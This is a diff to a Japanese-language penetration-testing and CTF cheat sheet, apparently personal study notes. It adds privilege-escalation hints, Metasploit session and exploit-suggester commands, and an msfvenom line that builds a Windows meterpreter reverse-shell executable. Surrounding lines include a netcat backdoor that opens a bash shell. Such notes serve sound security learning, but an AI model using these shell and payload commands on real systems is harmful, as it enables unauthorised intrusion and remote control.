@@ -60,6 +60,9 @@ https://github.com/rebootuser/LinEnum
 ###### 権限昇格Memo  
 ```パスワードとかがあったら使い回せないか調べる．```  
 ```実行可能なファイル（普段はなさそうなもの）を探す．```  
+```設定ファイル(config)```  
+```バックアップ(.old, .bak)```  
+
 
 <br>  
 
@@ -104,7 +107,31 @@ https://github.com/rebootuser/LinEnum
 > [IP]に指定するのは攻撃者側のIP  
 > [port]に指定するのは攻撃者側のport(規定値は4444)  
 
+```meterpreter> background```  
+> sessionをバックグランドに回す
+
+```use multi/recon/local_exploit_suggester```  
+> sessionが確立された後に，そのセッションを指定してrunすると使えそうな脆弱性を洗い出してくれる．  
+
+
+#### msfvenom  
 ```msfvenom -l payload```  
+> payloadの確認  
+
+```msfvenom -l format```  
+> formatの確認  
+
+```/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe```  
+> msfvenom使用例  
+> -pでpayload指定  
+> -fでformat指定  
+> payloadにmeterpreterが入っているもをの指定した場合は，msfconsoleのexploit/multi/handlerで待ち受けする(payloadはmsfvenomで使用したものと同じものを指定)  
+
+
+
+
+
+
 
 #### backdoor  
 ```nc -l -n 7777 -e /usr/bin/bash```  
@@ -235,6 +262,11 @@ ESC：詳細自動ステップ実行の停止
 #### pwn  
 ```nm a.out```  
 > 実行ファイル中のシンボルを表示  
+
+
+#### Windows cmd  
+```dir /s root.txt```  
+> カレントディレクトリからサブディレクトリを辿ってroot.txtを検索  
 
 
 
